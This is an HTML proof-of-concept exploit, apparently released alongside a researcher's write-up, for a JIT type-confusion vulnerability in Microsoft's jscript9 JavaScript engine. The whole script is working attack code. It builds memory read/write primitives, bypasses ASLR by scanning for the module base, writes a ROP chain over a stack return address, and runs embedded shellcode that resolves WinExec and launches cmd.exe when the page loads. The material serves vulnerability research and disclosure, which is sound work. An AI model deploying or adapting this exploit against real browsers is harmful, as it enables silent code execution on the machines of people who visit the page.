<!-- 
	Part of a full proof-of-concept exploit for a JIT Type Confusion vulnerability in Microsoft JavaScript engine (Jscript9.dll).

	Release version of the exploit

	Author: Alisa Esage (@alisaesage)
	Writeup: https://zerodayengineering.com/research/javascript-engines-exploitation.html
	Email: contact@zerodayengineering.com
-->
<html>
<head>
	<meta http-equiv="Cache-Control" content="no-cache"/>
</head>
<body>
<script>

news = [];
view = new Array( 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 )
view.obj = [0]
jscript9 = undefined


function func( f, u, n, c ) {

    f[0] = 0;
    u[0] = n;

    if (c) { f[0] = c;  }
    return f[0];

};


function initPrimitives() {

    let a = [1, 2, 3]
    let b = new Int8Array(0x10)

    for ( var i = 0; i < 0x101; i++ )
        news.push([0])

    for ( var q = 0; q < 0x1001; q++ )
        func(a, b, 0, q+1)

    let viewAddr = getAddrOf(view) + 0x38
    view.obj = getObjAt(viewAddr)

    view[0] = 0x7ab1e5
    view[1] = viewAddr + 0x1c + 4;
    view[4] = getAddrOf(new ArrayBuffer(0x10))
    view[6] = 0x10000000
    view[7] = 0x41414141
    view[8] = 0x2e
    view[9] = viewAddr 

}


function doit( stage2 ) {

    if ( !jscript9 )
	    jscript9 = bypassASLR();
	if ( !jscript9 ) throw "Unsupported version"


    let stack = getStack()
    let targetRet = jscript9.base + jscript9.ret;
    let retPtr = 0


    for ( var i = 0 ; i < 16*1024; i += 4 ) {
        let val = read32(stack - i)
        if (val == targetRet) {
            retPtr = stack - i;
            break
        }
    }


	let stage3 = new Uint8Array([
		0x31, 0xc0,	
		0xb9, 0, 0, 0, 0, 
		0xbe, 0, 0, 0, 0, 
		0xbf, 0, 0, 0, 0, 
		0x8b, 0xe7, 
		0xf3, 0xa5, 
		0x8b, 0xec, 
		0x81, 0xc5, 0x84, 0, 0, 0, 
		0xbe, 0, 0, 0, 0, 
		0xc2, 0x10, 0,
		0x9f, 0x9f, 0x9f, 0x9f 
	]);
	stage3.addr = read32( getAddrOf(stage3) + 8*4 );

	let stage2_3 = new Uint8Array(stage2.length + stage3.length)
	stage2_3.addr = read32( getAddrOf(stage2_3) + 8*4 );


    let stage1 = new Uint32Array([
		jscript9.base + jscript9.gadget1,
        3, 2, 1, 0,	
        0x1000,
        stage2_3.addr, 
		jscript9.base + jscript9.gadget2, 
        stage2_3.addr + stage2_3.length - 4,
        1, 2, 3, 4, 5, 6,
        0, 1, 0, 1, 0, 1,
        0, 1, 0, 1, 0, 1,
        0, 1, 0, 1, 0, 1,
		1,
        stage2_3.addr,
        0, 0, 0,
		0x40, 
		0, 0
    ]);
	stage1.addr = read32( getAddrOf(stage1) + 8*4 )
	

	let coe4 = new Uint32Array(stage1.length)
	coe4.addr = read32( getAddrOf(coe4) + 8*4 )
	

    for ( var i = 0; i < stage1.length; i ++ ) {
        coe4[i] = read32(retPtr + i*4)
        write32(retPtr + i*4, stage1[i])
    }


	write32(retPtr + 4*4, 0x48 + coe4.addr)
	write32(stage3.addr + 3, stage1.length)
	write32(stage3.addr + 8, coe4.addr)
	write32(stage3.addr + 13, retPtr)
	write32(stage3.addr + 30, read32( retPtr + 0xf0 ));

	stage2_3.set(stage2, 0)
	stage2_3.set(stage3, stage2.length)

}


function bypassASLR() {

	jscript9 = new Uint8Array(0x330000) 

	var start = read32( getAddrOf([{}]) )

	for ( var i = 0; i < 33; i ++ ) {
		start = start & 0xffff0000;
		if ( read32(start) == 0x00905a4d ) {
			jscript9.base = start;
			break;
		}
		start -= 0x10000;
	}

	if ( jscript9.base == undefined ) return undefined

	write32( getAddrOf(jscript9) + 0x20, jscript9.base )


	jscript9.ret = jscript9.findSignature([0x89, 0x45, 0xec, 0x85, 0xc0, 0x78, 0x1c, 0x8b, 0x45, 0x08, 0x85, 0xc0, 0x74, 0x15, 0x8b, 0x4e, 0x10])
	if ( jscript9.ret == -1 ) return undefined

	jscript9.gadget1 = jscript9.findSignature([0x5f, 0x5e, 0xc3])
	if ( jscript9.gadget1 == -1 ) return undefined

	jscript9.gadget2 = jscript9.findSignature([0xff, 0x75, 0x14, 0x57, 0x56, 0xff, 0x15, ,,,, 0x5f, 0x5e, 0x5b, 0x8b, 0xe5, 0x5d, 0xc2, 0x18])
	if ( jscript9.gadget2 == -1 ) return undefined

	return jscript9

}


function getStack() {

    let type = read32( getAddrOf([{}]) + 4)
    let javascriptLibrary = read32(type + 4)
    let scriptContext = read32(javascriptLibrary + 0x21c)
    let threadContext = read32(scriptContext + 0x250)
    let stackLimit = read32(threadContext + 0x18) 
    let stackBottom = stackLimit - 0xc000 + 2*1024*1024 - 4

    return stackBottom

}


function getAddrOf( obj ) {

    let a = news.pop()
    let b = new Int8Array(8)

    let result = func(a, b, {valueOf: function() {
        a[0] = obj
        return 0
    }})

    return result

}


function getObjAt( addr ) {

    let a = news.pop()
    let b = new Int8Array(8)

    func(a, b, {valueOf: function() {
        a[0] = {}
        return 0
    }}, addr)

    return a

}


function read32( addr ) {

    view[7] = addr;
    return DataView.prototype.getUint16.call(view.obj[0], 0, true) + (DataView.prototype.getUint16.call(view.obj[0], 2, true) << 16)

}


function write32( addr, value ) {

    view[7] = addr;
    DataView.prototype.setUint32.call(view.obj[0], 0, value, true)

}


Uint8Array.prototype.findIndex = function( callback ) {

    for (var i = 0; i < this.length; i++ ) {
        if ( callback(this[i], i, this) )
            return i
    }
    return -1

}


Uint8Array.prototype.findSignature = function( signature ) {

    function check( element, index, ary ) {
        if ( element != signature[0] ) return false;          
        for ( var i = 0; i < signature.length; i++ ) {
            if ( signature[i] == undefined ) continue;
            if ( ary[index+i] != signature[i] ) return false;
        }
        return true;
    }

    return this.findIndex(check)

} 


function main() {

	initPrimitives()

	var shellcode = new Uint8Array([
		0x31, 0xc9, 0x64, 0xa1, 0x30, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x0c, 0x8b, 0x70, 0x14, 0xad, 0x96, 0xad, 0x8b, 0x58, 0x10, 0x8b, 0x53, 0x3c, 0x01, 0xda, 0x8b, 0x52, 0x78, 0x01, 0xda, 0x8b, 0x72, 0x20, 0x01, 0xde, 0x31, 0xc9, 0x41, 0xad, 0x01, 0xd8, 0x81, 0x38, 0x47, 0x65, 0x74, 0x50, 0x75, 0xf4, 0x81, 0x78, 0x04, 0x72, 0x6f, 0x63, 0x41, 0x75, 0xeb, 0x81, 0x78, 0x08, 0x64, 0x64, 0x72, 0x65, 0x75, 0xe2, 0x8b, 0x72, 0x24, 0x01, 0xde, 0x66, 0x8b, 0x0c, 0x4e, 0x49, 0x8b, 0x72, 0x1c, 0x01, 0xde, 0x8b, 0x14, 0x8e, 0x01, 0xda, 0x31, 0xf6, 0x52, 0x5e, 0x31, 0xff, 0x53, 0x5f, 0x31, 0xc9, 0x51, 0x68, 0x78, 0x65, 0x63, 0x00, 0x68, 0x57, 0x69, 0x6e, 0x45, 0x89, 0xe1, 0x51, 0x53, 0xff, 0xd2, 0x31, 0xc9, 0x51, 0x68, 0x65, 0x73, 0x73, 0x00, 0x68, 0x50, 0x72, 0x6f, 0x63, 0x68, 0x45, 0x78, 0x69, 0x74, 0x89, 0xe1, 0x51, 0x57, 0x31, 0xff, 0x89, 0xc7, 0xff, 0xd6, 0x31, 0xf6, 0x50, 0x5e, 0x31, 0xc9, 0x51, 0x68, 0x65, 0x78, 0x65, 0x00, 0x68, 0x63, 0x6d, 0x64, 0x2e, 0x89, 0xe1, 0x6a, 0x01, 0x51, 0xff, 0xd7
	]) 

	doit(shellcode)

}


main()


</script>

...3, 2, 1, 0

<script>
    alert('Hello, Universe')
</script>

</body> </html>
